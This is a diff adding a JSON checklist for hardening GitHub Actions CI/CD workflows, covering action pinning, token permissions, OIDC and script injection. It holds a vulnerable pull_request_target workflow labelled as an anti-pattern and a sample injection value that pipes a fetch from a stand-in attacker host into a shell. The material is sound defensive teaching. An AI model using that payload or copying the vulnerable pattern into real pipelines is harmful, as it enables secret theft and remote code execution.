@@ -1,0 +1,126 @@
+{
+  "id": "github-actions-security",
+  "slug": "github-actions-security",
+  "title": "GitHub Actions Security Hardening Checklist",
+  "description": "Essential security checklist for hardening GitHub Actions CI/CD workflows, tokens, permissions, runner environments, and supply-chain dependencies.",
+  "category": "Security",
+  "difficulty": "intermediate",
+  "estimatedTime": "45-60 minutes",
+  "tags": ["github-actions", "security", "ci-cd", "devsecops", "supply-chain"],
+  "items": [
+    {
+      "id": "pin-actions-sha",
+      "title": "Pin third-party actions to full commit SHAs",
+      "description": "Tags like @v4 or @v1 can be silently modified or hijacked if an upstream maintainer account or repository is compromised. Pin external actions to full 40-character commit SHAs and annotate them with comments indicating the version tag.",
+      "critical": true,
+      "codeBlocks": [
+        {
+          "language": "yaml",
+          "label": "Pin actions to immutable commit SHA",
+          "code": "# Good: Pinned to exact commit SHA with version comment\n- name: Checkout repository\n  uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n\n# Bad: Mutable tag that could be overwritten or hijacked\n- name: Checkout repository\n  uses: actions/checkout@v4"
+        },
+        {
+          "language": "bash",
+          "label": "Find current commit SHA for an action release",
+          "code": "git ls-remote https://github.com/actions/checkout.git refs/tags/v4.2.2"
+        }
+      ]
+    },
+    {
+      "id": "least-privilege-permissions",
+      "title": "Enforce least-privilege GITHUB_TOKEN permissions",
+      "description": "By default, GITHUB_TOKEN may inherit permissive read and write privileges across repository scopes. Explicitly declare top-level permissions as contents: read, or use empty permissions: {} and only grant required scopes to specific jobs.",
+      "critical": true,
+      "codeBlocks": [
+        {
+          "language": "yaml",
+          "label": "Top-level and job-level minimal permissions",
+          "code": "# Set minimal read-only defaults for all jobs\npermissions:\n  contents: read\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write  # Scoped specifically for OIDC authentication\n      packages: write  # Scoped specifically for container publishing"
+        }
+      ]
+    },
+    {
+      "id": "avoid-pull-request-target-untrusted-code",
+      "title": "Never check out or execute untrusted code with pull_request_target",
+      "description": "The pull_request_target trigger runs in the context of the base repository and has access to repository secrets and write tokens. Never combine pull_request_target with checking out the head ref (PR branch) and running build or test scripts, as this allows attackers to steal secrets via malicious PRs.",
+      "critical": true,
+      "codeBlocks": [
+        {
+          "language": "yaml",
+          "label": "Dangerous anti-pattern: pwn request vulnerability",
+          "code": "# DANGEROUS: Executes untrusted fork code with repository secrets!\non: pull_request_target\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm test  # Attacker can execute arbitrary code to exfiltrate secrets!"
+        },
+        {
+          "language": "yaml",
+          "label": "Safe pattern: Use standard pull_request event for untrusted code",
+          "code": "# Safe: Runs in isolated context without access to repository secrets\non: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n      - run: npm test"
+        }
+      ]
+    },
+    {
+      "id": "use-oidc-for-cloud-auth",
+      "title": "Use OpenID Connect (OIDC) instead of static cloud credentials",
+      "description": "Do not store long-lived cloud credentials (like AWS IAM access keys or GCP service account JSON keys) as GitHub secrets. Use GitHub's OIDC provider to exchange short-lived tokens directly with AWS STS, Google Cloud Workload Identity Federation, or Azure AD.",
+      "critical": true,
+      "codeBlocks": [
+        {
+          "language": "yaml",
+          "label": "Authenticate to AWS using OIDC",
+          "code": "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      contents: read\n    steps:\n      - name: Configure AWS credentials via OIDC\n        uses: aws-actions/configure-aws-credentials@e3ddf4a3c70b8976a200c1e133629934d40a662c # v4.0.2\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy-role\n          aws-region: us-east-1"
+        }
+      ]
+    },
+    {
+      "id": "prevent-script-injection",
+      "title": "Prevent script injection from user-controlled inputs",
+      "description": "Directly interpolating untrusted GitHub context variables (such as issue titles, PR descriptions, or commit messages) inside run scripts can lead to command injection. Pass untrusted context variables via environment variables instead of inline template expressions.",
+      "critical": true,
+      "codeBlocks": [
+        {
+          "language": "yaml",
+          "label": "Safe parameter handling via environment variables",
+          "code": "# BAD: Vulnerable to command injection if title is '; curl attacker.com | sh'\n- run: echo \"Processing issue ${{ github.event.issue.title }}\"\n\n# GOOD: Pass context variable safely as an environment variable\n- name: Print issue title safely\n  env:\n    ISSUE_TITLE: ${{ github.event.issue.title }}\n  run: echo \"Processing issue $ISSUE_TITLE\""
+        }
+      ]
+    },
+    {
+      "id": "harden-runner-environments",
+      "title": "Use ephemeral runners and configure job timeouts",
+      "description": "Never use shared self-hosted runners for public repositories without ephemeral VMs or containers. A compromised PR could persist malicious backdoors between jobs. Prefer GitHub-hosted runners, and always configure job timeouts to prevent runaway resource consumption.",
+      "critical": false,
+      "codeBlocks": [
+        {
+          "language": "yaml",
+          "label": "Job timeout and runner isolation",
+          "code": "jobs:\n  test:\n    runs-on: ubuntu-latest  # Clean, ephemeral runner\n    timeout-minutes: 15     # Kills hung or compromised processes after 15 min"
+        }
+      ]
+    },
+    {
+      "id": "environment-protection-and-approvals",
+      "title": "Configure environment protection rules and required approvals",
+      "description": "Use GitHub Environments (such as 'production' or 'staging') with required reviewer approvals, deployment branch restrictions, and environment-scoped secrets. This prevents untested branches or unapproved PRs from deploying automatically.",
+      "critical": false,
+      "codeBlocks": [
+        {
+          "language": "yaml",
+          "label": "Target protected environment in deployment workflow",
+          "code": "jobs:\n  deploy-prod:\n    runs-on: ubuntu-latest\n    environment:\n      name: production\n      url: https://app.example.com\n    steps:\n      - name: Deploy\n        run: ./scripts/deploy.sh"
+        }
+      ]
+    },
+    {
+      "id": "automate-dependency-updates",
+      "title": "Automate action dependency updates with Dependabot",
+      "description": "Configure Dependabot for github-actions to automatically receive pull requests when pinned actions release new versions or security patches. Combine with SHA pinning for a secure, automated maintenance loop.",
+      "critical": false,
+      "codeBlocks": [
+        {
+          "language": "yaml",
+          "label": ".github/dependabot.yml configuration",
+          "code": "version: 2\nupdates:\n  - package-ecosystem: \"github-actions\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    open-pull-requests-limit: 10"
+        }
+      ]
+    }
+  ]
+}
